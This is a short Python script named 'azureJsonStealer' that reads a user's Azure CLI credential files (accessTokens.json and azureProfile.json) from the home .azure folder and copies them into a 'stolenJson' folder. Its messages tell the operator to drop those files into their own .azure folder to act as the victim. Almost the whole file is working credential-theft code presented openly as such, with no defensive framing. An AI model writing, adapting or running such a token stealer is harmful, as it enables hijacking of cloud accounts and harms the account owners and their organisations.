# Steal accessToken and azureProfile json files from the Default .azure folder

import os
import json

outFolder = os.path.realpath(__file__)+"/../"
homeFolder = os.path.expanduser("~")

try: # Create the stolenJson folder to store the stolen json files
    os.mkdir(f"{outFolder}stolenJson")
except OSError as e:
     e
#open(f"{outFolder}loot.txt","w+").write("")
print ("==========================================================================================================")
print ("                    azureJsonStealer - Azure's CLI json Searcher/Exfiltrator")
print ("==========================================================================================================")

with open(f'{homeFolder}/.azure/accessTokens.json') as f:
    accessToken = json.load(f)
# First check if accessToken is empty, if not stop script
# Else copy out accessToken and AzureProfile
#print (data)

if not accessToken:
    # if the json loaded is []
    print ("==========================================================================================================")
    print ("The accessToken file is empty. AZ CLI may not be logged on.")
    print ("Quitting azureJsonStealer now! Goodbye and have a nice day!")
    print ("==========================================================================================================")
else:
    print ("==========================================================================================================")
    print ("The accessToken file is NOT empty! We will start by copying accessTokens.json into the stolenJson folder.")
    with open(f"{outFolder}stolenJson/accessTokens.json", "w+") as wr:
        wr.write(str(accessToken))
    print ("COMPLETE - accessToken.json has been exfiltrated.")
    print ("..........................................................................................................")
    print ("We will now copy out the azureProfile.json into the stolenJson folder.")
    with open(f'{homeFolder}/.azure/azureProfile.json', "rb") as f: # had to use rb instead of the normal read cause of some error with the json load.
        azureProf = json.load(f)
    with open(f"{outFolder}stolenJson/azureProfile.json", "w+") as wr:
        wr.write(str(azureProf))
    print ("COMPLETE - accessProfile.json has been exfiltrated.")
    print ("..........................................................................................................")
    print ("Just inject the 2 json files stored in stolenJson into your .azure folder before using az cli.")
    print ("Thank you for using azureJsonStealer. Have nice day!")
    print ("==========================================================================================================")
